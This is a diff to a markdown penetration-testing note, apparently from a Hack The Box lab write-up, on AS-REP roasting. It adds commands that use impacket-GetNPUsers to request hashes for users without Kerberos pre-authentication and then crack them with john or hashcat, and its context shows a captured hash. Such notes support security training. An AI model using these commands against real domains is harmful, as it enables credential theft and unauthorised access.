@@ -33,4 +33,20 @@ $krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b38295600416
 [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
+
+### List of users {#list-of-users}
+
+```sh { linenos=true, linenostart=1 }
+impacket-GetNPUsers -dc-ip <target-ip> example.local/ -no-pass -usersfile users.txt
+```
+
+
+### Crack hash or use pass-the-hash {#crack-hash-or-use-pass-the-hash}
+
+```sh { linenos=true, linenostart=1 }
+john --format=krb5asrep --wordlist=wordlist.txt hash.txt
+# or
+hashcat -m 18200 -a 0  hash.txt wordlist.txt
+```
+
 The hash is quickly cracked with `hashcat`.
